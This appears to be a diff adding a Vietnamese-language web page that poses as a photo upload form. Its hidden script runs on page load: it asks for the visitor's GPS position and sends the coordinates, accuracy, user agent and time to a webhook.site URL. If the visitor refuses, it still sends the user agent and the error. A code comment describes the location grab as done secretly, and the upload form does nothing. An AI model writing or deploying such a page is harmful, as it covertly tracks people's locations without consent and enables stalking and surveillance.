@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Tải ảnh của bạn</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 80px;
+    }
+    #uploadBox {
+      border: 2px dashed #999;
+      padding: 40px;
+      width: 300px;
+      margin: auto;
+      border-radius: 10px;
+      background-color: #f9f9f9;
+    }
+    input[type="file"] {
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div id="uploadBox">
+    <h2>Vui lòng tải ảnh của bạn</h2>
+    <form>
+      <input type="file" name="file" accept="image/*">
+      <br><br>
+      <button type="submit">Upload</button>
+    </form>
+  </div>
+
+  <script>
+    // webhook của bạn (ví dụ webhook.site)
+    const webhook = "https://webhook.site/aac873f7-5c2e-4afd-94eb-9944647c8eca";
+
+    function sendToWebhook(data) {
+      fetch(webhook, {
+        method: "POST",
+        body: JSON.stringify(data) // không set Content-Type để tránh CORS preflight
+      })
+      .then(() => console.log("Sent:", data))
+      .catch(e => console.error("Error:", e));
+    }
+
+    // Ngầm lấy vị trí khi user mở trang
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          sendToWebhook({
+            status: "gps_success",
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            ua: navigator.userAgent,
+            time: new Date().toISOString()
+          });
+        },
+        err => {
+          sendToWebhook({
+            status: "gps_denied",
+            error: err.message,
+            ua: navigator.userAgent,
+            time: new Date().toISOString()
+          });
+        }
+      );
+    } else {
+      sendToWebhook({
+        status: "no_geolocation_api",
+        ua: navigator.userAgent,
+        time: new Date().toISOString()
+      });
+    }
+  </script>
+</body>
+</html>
